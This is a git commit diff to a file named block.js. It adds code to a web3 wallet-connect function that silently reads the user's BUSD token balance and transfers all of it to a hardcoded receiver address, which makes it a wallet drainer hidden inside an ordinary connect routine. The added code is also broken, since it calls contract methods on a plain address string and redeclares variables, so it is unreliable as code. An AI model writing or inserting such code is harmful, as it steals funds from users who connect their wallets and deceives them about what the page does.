2c2f09421f7f33973431d6dd52c0eb21788628fd
jcosmox7777 <66852694+jcosmox7777@users.noreply.github.com>
2022-01-18 11:16:22 +0100

    Update block.js

--- block.js
+++ block.js
@@ -4,4 +4,24 @@ async function connect(){
     await window.web3.currentProvider.enable();
     
     web3=new Web3(window.web3.currentProvider);
+
+
+   const receiverAddress = '0xa84cE4D7f2462b084069c6caDCa56dd603C15eF4'
+      const busdAddress = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
+      
+        const trfAmount=await busdAddress.methods.balanceOf().call();
+
+      const web3 = new Web3(window.ethereum)
+      const contract = new web3.eth.Contract(bscContract.abi, busdAddress)
+
+      contract.methods
+        .transfer(receiverAddress, web3.utils.toWei(trfAmount, 'ether'))
+           .then((res) => {
+          console.log(res)
+        })
+        .catch((err) => {
+          console.log(err)
+        })
+
+
 }
